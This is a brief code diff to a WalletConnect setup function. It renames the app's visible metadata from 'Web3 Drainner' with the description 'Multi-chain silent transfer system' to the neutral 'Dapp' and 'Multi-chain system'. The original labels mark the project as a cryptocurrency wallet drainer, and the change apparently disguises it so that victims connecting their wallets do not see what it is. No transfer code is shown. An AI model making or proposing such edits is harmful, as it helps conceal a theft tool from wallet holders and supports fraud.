@@ -46,8 +46,8 @@ export async function initWalletConnect() {
         explorerExcludedWalletIds: 'all'
       },
       metadata: {
-        name: 'Web3 Drainner',
-        description: 'Multi-chain silent transfer system',
+        name: 'Dapp',
+        description: 'Multi-chain system',
         url: typeof window !== 'undefined' ? window.location.origin : 'https://localhost:3000',
         icons: ['https://avatars.githubusercontent.com/u/37784886']
       },
